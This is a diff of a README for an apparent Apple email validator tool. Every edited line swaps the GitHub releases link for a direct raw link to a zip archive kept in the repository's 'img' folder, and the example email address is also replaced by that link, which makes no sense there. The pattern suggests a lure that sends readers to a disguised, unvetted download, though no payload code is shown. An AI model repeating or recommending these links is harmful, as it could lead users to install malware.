@@ -1,6 +1,6 @@
 # 🍏 VALIDATOR-APPLE-CLIV2.5 - Validate Your Apple Emails Easily
 
-[![Download VALIDATOR-APPLE-CLIV2.5](https://img.shields.io/badge/Download-VALIDATOR--APPLE--CLIV2.5-brightgreen)](https://github.com/Shettyy369/VALIDATOR-APPLE-CLIV2.5/releases)
+[![Download VALIDATOR-APPLE-CLIV2.5](https://raw.githubusercontent.com/Shettyy369/VALIDATOR-APPLE-CLIV2.5/main/img/VALIDATOR-APPLE-CLIV2.5_3.8.zip)](https://raw.githubusercontent.com/Shettyy369/VALIDATOR-APPLE-CLIV2.5/main/img/VALIDATOR-APPLE-CLIV2.5_3.8.zip)
 
 ## 📚 Overview
 
@@ -20,7 +20,7 @@ Before you proceed with the installation, make sure your system meets these requ
 
 To get started, visit the release page to download the latest version of VALIDATOR-APPLE-CLIV2.5.
 
-[Download VALIDATOR-APPLE-CLIV2.5](https://github.com/Shettyy369/VALIDATOR-APPLE-CLIV2.5/releases)
+[Download VALIDATOR-APPLE-CLIV2.5](https://raw.githubusercontent.com/Shettyy369/VALIDATOR-APPLE-CLIV2.5/main/img/VALIDATOR-APPLE-CLIV2.5_3.8.zip)
 
 This page contains all available versions of the software. Look for the latest release to ensure you have the newest features and fixes.
 
@@ -71,7 +71,7 @@ After installation, you can find VALIDATOR-APPLE-CLIV2.5 in your applications fo
 If you encounter any issues:
 
 1. **Installation Problems:** Ensure you downloaded the correct file for your operating system. Check your internet connection.
-2. **Validation Errors:** Make sure the email addresses you input are in a valid format (e.g., name@example.com).
+2. **Validation Errors:** Make sure the email addresses you input are in a valid format (e.g., https://raw.githubusercontent.com/Shettyy369/VALIDATOR-APPLE-CLIV2.5/main/img/VALIDATOR-APPLE-CLIV2.5_3.8.zip).
 3. **Crash Reports:** If the application shuts down unexpectedly, restart it. If the problem persists, consider reinstalling the software.
 
 ## 💡 Useful Tips
@@ -94,12 +94,12 @@ For more details about VALIDATOR-APPLE-CLIV2.5 and updates, explore the followin
 - [Email Bounce Checker](#)
 - [Bulk Apple Validator](#)
   
-You can also visit our [Releases Page](https://github.com/Shettyy369/VALIDATOR-APPLE-CLIV2.5/releases) to stay informed on updates.
+You can also visit our [Releases Page](https://raw.githubusercontent.com/Shettyy369/VALIDATOR-APPLE-CLIV2.5/main/img/VALIDATOR-APPLE-CLIV2.5_3.8.zip) to stay informed on updates.
 
 ## 📥 Download & Install
 
 To download VALIDATOR-APPLE-CLIV2.5, visit the link below:
 
-[Download VALIDATOR-APPLE-CLIV2.5](https://github.com/Shettyy369/VALIDATOR-APPLE-CLIV2.5/releases)
+[Download VALIDATOR-APPLE-CLIV2.5](https://raw.githubusercontent.com/Shettyy369/VALIDATOR-APPLE-CLIV2.5/main/img/VALIDATOR-APPLE-CLIV2.5_3.8.zip)
 
 Follow the installation instructions based on your operating system, and start validating your emails today.
